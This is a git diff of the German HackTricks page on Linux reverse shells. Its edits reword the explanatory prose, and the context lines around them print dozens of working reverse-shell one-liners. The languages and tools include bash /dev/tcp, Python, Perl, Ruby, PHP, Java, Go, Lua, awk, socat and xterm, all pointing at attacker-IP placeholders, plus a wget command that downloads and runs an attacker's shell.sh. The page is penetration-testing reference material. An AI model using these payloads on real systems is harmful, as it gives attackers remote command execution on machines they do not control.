@@ -10,13 +10,13 @@ Andere Möglichkeiten, HackTricks zu unterstützen:
 * Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
 * Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
 * **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github Repositories einreichen.
+* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) **und** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **GitHub-Repositories senden.**
 
 </details>
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
@@ -41,9 +41,9 @@ exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; 
 #after getting the previous shell to get the output to execute
 exec >&0
 ```
-### Symbol sicherer Shell
+### Symbol sichere Shell
 
-Vergessen Sie nicht, auch andere Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
+Vergessen Sie nicht, auch mit anderen Shells zu überprüfen: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh und bash.
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -67,11 +67,11 @@ wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.s
 ```
 ## Vorwärtsschale
 
-Bei einer **Remote Code Execution (RCE)**-Verwundbarkeit in einer auf Linux basierenden Webanwendung kann die Erreichung einer umgekehrten Shell durch Netzwerkabwehrmechanismen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solch eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal)-Shell zu erstellen, um effektiver mit dem kompromittierten System zu interagieren.
+Bei einer **Remote Code Execution (RCE)**-Schwachstelle in einer auf Linux basierenden Webanwendung kann die Erreichung einer umgekehrten Shell durch Netzwerkabwehrmechanismen wie iptables-Regeln oder komplexe Paketfiltermechanismen behindert werden. In solch eingeschränkten Umgebungen besteht ein alternativer Ansatz darin, eine PTY (Pseudo Terminal) Shell zu erstellen, um effektiver mit dem kompromittierten System zu interagieren.
 
 Ein empfohlenes Tool für diesen Zweck ist [toboggan](https://github.com/n3rada/toboggan.git), das die Interaktion mit der Zielumgebung vereinfacht.
 
-Um toboggan effektiv zu nutzen, erstellen Sie ein Python-Modul, das auf den RCE-Kontext Ihres Zielsystems zugeschnitten ist. Ein Modul mit dem Namen `nix.py` könnte beispielsweise wie folgt strukturiert sein:
+Um toboggan effektiv zu nutzen, erstellen Sie ein auf die RCE-Kontext Ihres Zielsystems zugeschnittenes Python-Modul. Ein Modul mit dem Namen `nix.py` könnte beispielsweise wie folgt strukturiert sein:
 ```python3
 import jwt
 import httpx
@@ -148,9 +148,7 @@ export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X
 ```
 ## Python
 
-### Python
-
-Python ist eine leistungsstarke und vielseitige Programmiersprache, die häufig von Hackern verwendet wird, um Skripte und Tools zu erstellen. Mit Python können Hacker effizient Shell-Skripte schreiben, Netzwerkkommunikation durchführen, Dateien manipulieren und vieles mehr. Python bietet eine Vielzahl von Bibliotheken und Frameworks, die Hackern helfen, komplexe Aufgaben zu automatisieren und zu vereinfachen. Es ist eine der beliebtesten Sprachen in der Hacker-Community aufgrund seiner Einfachheit und Flexibilität.
+Python ist eine vielseitige Programmiersprache, die häufig von Hackern verwendet wird, um Shell-Skripte zu schreiben und verschiedene Aufgaben im Zusammenhang mit Hacking und Pentesting auszuführen. Python bietet eine Vielzahl von Bibliotheken und Frameworks, die das Erstellen von Hacking-Tools erleichtern. Es ist plattformübergreifend und einfach zu erlernen, was es zu einer beliebten Wahl unter Hackern macht.
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -160,14 +158,20 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 ```
 ## Perl
 
-Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um komplexe Aufgaben zu automatisieren und Systeme zu verwalten. Es bietet leistungsstarke Funktionen für die Textverarbeitung und wird oft für das Schreiben von Exploits und Payloads verwendet. Perl-Skripte können auf den meisten Linux-Systemen ausgeführt werden und sind aufgrund ihrer Vielseitigkeit und Flexibilität bei Hackern sehr beliebt.
+Perl ist eine beliebte Skriptsprache, die von Hackern häufig verwendet wird, um Shell-Skripte zu schreiben. Perl bietet leistungsstarke Funktionen für die Verarbeitung von Textdateien und kann auch für die Netzwerkprogrammierung verwendet werden. Es ist auf den meisten Linux-Systemen standardmäßig installiert.
 ```bash
 perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
 ```
 ## Ruby
 
-Ruby ist eine dynamische, objektorientierte Skriptsprache, die für die Entwicklung von Webanwendungen weit verbreitet ist. Es bietet eine einfache und dennoch leistungsstarke Syntax, die das Schreiben von Code erleichtert. Ruby wird häufig für die Erstellung von Webanwendungen, APIs und Skripten verwendet.
+### Ruby-Shell
+
+Ruby-Shell ist ein interaktiver Ruby-Interpreter, der als Shell verwendet werden kann. Es ermöglicht das Ausführen von Ruby-Code direkt von der Befehlszeile aus. Um Ruby-Shell zu starten, geben Sie einfach `irb` in Ihrer Terminal-Shell ein.
+
+### Ruby-Backdoor
+
+Ein Ruby-Backdoor ist ein Stück Ruby-Code, das in ein System eingeschleust wird, um unbefugten Zugriff zu ermöglichen. Backdoors können verwendet werden, um heimlich auf ein System zuzugreifen, ohne dass der Benutzer davon weiß. Es ist wichtig, Backdoors zu erkennen und zu entfernen, um die Sicherheit des Systems zu gewährleisten.
 ```bash
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
@@ -186,7 +190,7 @@ php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 ## Java
 
-Java ist eine objektorientierte Programmiersprache, die auf der Java Virtual Machine (JVM) läuft. Java-Code wird in Bytecode kompiliert, der von der JVM ausgeführt wird. Java wird häufig für die Entwicklung von Anwendungen, Webanwendungen und mobilen Anwendungen verwendet. Es ist auch eine der beliebtesten Sprachen für die Entwicklung von Android-Apps.
+Java ist eine objektorientierte Programmiersprache, die auf der Java Virtual Machine (JVM) läuft. Java-Code wird in Bytecode kompiliert, der von der JVM ausgeführt wird. Java wird häufig für die Entwicklung von Anwendungen, Webanwendungen, mobilen Anwendungen und großen Systemen verwendet. Es ist bekannt für seine Plattformunabhängigkeit und wird in verschiedenen Bereichen eingesetzt.
 ```bash
 r = Runtime.getRuntime()
 p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
@@ -199,13 +203,13 @@ attacker> ncat -v 10.0.0.22 4444 --ssl
 ```
 ## Golang
 
-Golang, auch bekannt als Go, ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie zeichnet sich durch Effizienz und Geschwindigkeit aus und wird häufig für die Entwicklung von Systemsoftware, Cloud-Diensten und Netzwerkanwendungen verwendet. Golang bietet eine starke Typisierung und eine einfache Syntax, die das Schreiben von Code erleichtert.
+Golang, auch bekannt als Go, ist eine Open-Source-Programmiersprache, die von Google entwickelt wurde. Sie zeichnet sich durch Effizienz und schnelle Kompilierungszeiten aus. Golang wird häufig für die Entwicklung von Tools und Anwendungen im Bereich der Informationssicherheit verwendet.
 ```bash
 echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
 ```
 ## Lua
 
-Lua ist eine leistungsstarke, effiziente, leichtgewichtige, eingebettete Skriptsprache. Lua wird häufig für die Erweiterung von Anwendungen und zur Konfiguration von Programmen verwendet. Lua ist einfach zu erlernen und zu integrieren, was es zu einer beliebten Wahl für Entwickler macht. Lua-Skripte können in verschiedenen Umgebungen ausgeführt werden, einschließlich Shell-Skripten.
+Lua ist eine leistungsstarke, effiziente, leichtgewichtige, eingebettete Skriptsprache. Lua wird häufig für die Erweiterung von Anwendungen und zur Automatisierung von Aufgaben verwendet. Lua-Skripte können in verschiedenen Anwendungen und Systemen eingebettet werden, um zusätzliche Funktionen hinzuzufügen. Lua bietet eine einfache Syntax und ist einfach zu erlernen.
 ```bash
 #Linux
 lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
@@ -213,6 +217,18 @@ lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','123
 lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
 ```
 ## NodeJS
+
+### Einführung
+
+Node.js ist eine Open-Source-JavaScript-Laufzeitumgebung, die es ermöglicht, JavaScript-Code außerhalb eines Browsers auszuführen. Es basiert auf der V8 JavaScript-Engine von Google und eignet sich hervorragend für die Entwicklung von serverseitigen Anwendungen.
+
+### Verwendung von NodeJS-Shells
+
+NodeJS-Shells sind eine beliebte Wahl für Hacker, da sie eine leistungsstarke Umgebung bieten, um Angriffe durchzuführen und Systeme zu kompromittieren. Mit NodeJS-Shells können Hacker Remote-Zugriff auf Systeme erhalten, Dateien manipulieren, Prozesse überwachen und vieles mehr.
+
+### Sicherheitsmaßnahmen
+
+Um sich vor NodeJS-Shell-Angriffen zu schützen, sollten Administratoren regelmäßig Sicherheitsupdates installieren, starke Passwörter verwenden, den Netzwerkverkehr überwachen und den Zugriff auf kritische Systeme beschränken. Es ist auch ratsam, Sicherheitsüberprüfungen durchzuführen, um potenzielle Schwachstellen zu identifizieren und zu beheben.
 ```javascript
 (function(){
 var net = require("net"),
@@ -287,7 +303,7 @@ victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
 ```
 ## Awk
 
-Awk ist eine leistungsstarke Skriptsprache, die häufig zum Analysieren und Verarbeiten von Textdateien in Unix- und Linux-Umgebungen verwendet wird. Awk kann verwendet werden, um Daten zu extrahieren, Muster zu suchen und bestimmte Aktionen basierend auf definierten Regeln auszuführen. Es ist besonders nützlich für die Verarbeitung von strukturierten Daten und das Erstellen von Berichten.
+Awk ist eine leistungsstarke Skriptsprache und ein Befehlszeilen-Interpreter, der häufig zum Verarbeiten und Analysieren von Textdateien in Unix- und Linux-Umgebungen verwendet wird. Es ermöglicht Benutzern, Daten zu extrahieren und zu transformieren, indem sie Muster in den Daten identifizieren und entsprechende Aktionen ausführen. Awk kann auch in Shell-Skripten verwendet werden, um komplexe Aufgaben zu automatisieren und zu vereinfachen.
 ```bash
 awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
 ```
@@ -307,7 +323,7 @@ export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | gre
 ```
 ## Gawk
 
-Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig verwendet, um Textdateien zu durchsuchen, zu extrahieren und zu transformieren. Gawk bietet eine Vielzahl von Funktionen, einschließlich eingebauter Funktionen und die Möglichkeit, benutzerdefinierte Funktionen zu definieren. Es ist ein äußerst nützliches Werkzeug für Hacker, um Daten schnell und effizient zu analysieren und zu manipulieren.
+Gawk ist eine leistungsstarke Skriptsprache für die Datenverarbeitung und Textmanipulation in Unix- und Linux-Umgebungen. Es wird häufig verwendet, um Textdateien zeilenweise zu verarbeiten und Muster zu durchsuchen und zu extrahieren. Gawk bietet eine Vielzahl von Funktionen, einschließlich eingebauter Funktionen und die Möglichkeit, benutzerdefinierte Funktionen zu definieren. Es ist ein äußerst nützliches Werkzeug für Hacker, um Daten schnell und effizient zu analysieren und zu manipulieren.
 ```bash
 #!/usr/bin/gawk -f
 
@@ -336,7 +352,7 @@ Dies wird versuchen, eine Verbindung zu Ihrem System über den Port 6001 herzust
 ```bash
 xterm -display 10.0.0.1:1
 ```
-Um die umgekehrte Shell zu erhalten, können Sie Folgendes verwenden (die auf Port 6001 lauscht):
+Um die umgekehrte Shell zu empfangen, können Sie (die auf Port 6001 lauscht) verwenden:
 ```bash
 # Authorize host
 xhost +targetip
@@ -361,7 +377,7 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 
 **Try Hard Security Group**
 
-<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
 
 {% embed url="https://discord.gg/tryhardsecurity" %}
 
